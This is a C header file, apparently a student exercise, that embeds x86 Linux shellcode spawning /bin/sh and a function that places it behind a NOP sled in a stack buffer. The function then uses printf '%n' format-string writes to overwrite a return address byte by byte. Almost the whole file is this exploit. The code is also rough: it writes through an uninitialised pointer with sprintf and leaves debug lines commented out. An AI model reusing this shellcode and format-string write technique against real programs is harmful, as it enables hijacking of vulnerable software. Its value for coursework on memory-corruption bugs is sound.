/*
 * arbitrary_write.h
 *
 *  Created on: Oct 17, 2016
 *      Author: student
 */

#ifndef ARBITRARY_WRITE_H_
#define ARBITRARY_WRITE_H_


char shellcode[] = "\x90\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80";

int hex_to_dec(char hex)
{
	printf("%d\n",(int)hex);
	return 0;
}

void arbitrary_write(){
	char buffer[64];
	int i=0;

	for(;i!=16;i++)
	{
		buffer[i]='\x90';
	}
	for(;i!=16+strlen(shellcode);i++)
	{
		buffer[i]=shellcode[i-16];
		//printf("%d\t%02x\n",i-16,shellcode[i-16]);
	}
	for(;i!=64;i++)
	{
		buffer[i]='\x90';
	}
	char begin[4] ="\x00\x00\x00\x00";
	char retadd[4]="\xff\xff\xd4\xf0";
	char end[4] ="\x00\x00\x00\x00";
	//printf(retadd);
	//printf("\t");
	unsigned char a = (unsigned char) retadd[0];
	unsigned char b = (unsigned char) retadd[1];
	unsigned char c = (unsigned char) retadd[2];
	unsigned char d = (unsigned char) retadd[3];
	char *percent = "%";

	char *digit;

	sprintf(digit,"%s%u%s%s%s",percent,d,"u",percent,"n");
	printf(digit,123,&buffer[63]+29);
	sprintf(digit,"%s%u%s%s%s",percent,c,"u",percent,"n");
	printf(digit,123,&buffer[63]+30);
	sprintf(digit,"%s%u%s%s%s",percent,b,"u",percent,"n");
	printf(digit,123,&buffer[63]+31);
	sprintf(digit,"%s%u%s%s%s",percent,a,"u",percent,"n");
	printf(digit,123,&buffer[63]+32);

	//printf("\n%s%u%s%s%s\n",percent,c,"u",percent,"n");
	//sprintf(second_digit,"%s%u%s%s%s",percent,c,"u",percent,"n");

	//sprintf(third_digit,"%s%u%s%s%s",percent,b,"u",percent,"n");

	//sprintf(fourth_digit,"%s%u%s%s%s",percent,a,"u",percent,"n");


	//printf(second_digit,123,&buffer[63]+37);
	//printf(third_digit,123,&buffer[63]+38);
	//printf(fourth_digit,123,&buffer[63]+39);


	/*
	printf("\n%u\t%u\t%u\t%u\n",a,b,c,d);

	unsigned long int retvalue=strtoul(retadd,NULL,16);
	printf("%lu\n",retvalue);
	printf("hello\t%s\n",retadd);

	printf("%8x\n",&buffer[63]);
	printf("%8x\n",&buffer[63]+16);

	printf("%n\n",&buffer[63]+16);
	printf("%n\n",&buffer[63]+17);
	printf("%n\n",&buffer[63]+18);
	printf("%n\n",&buffer[63]+19);
	*/
		
}

#endif /* ARBITRARY_WRITE_H_ */
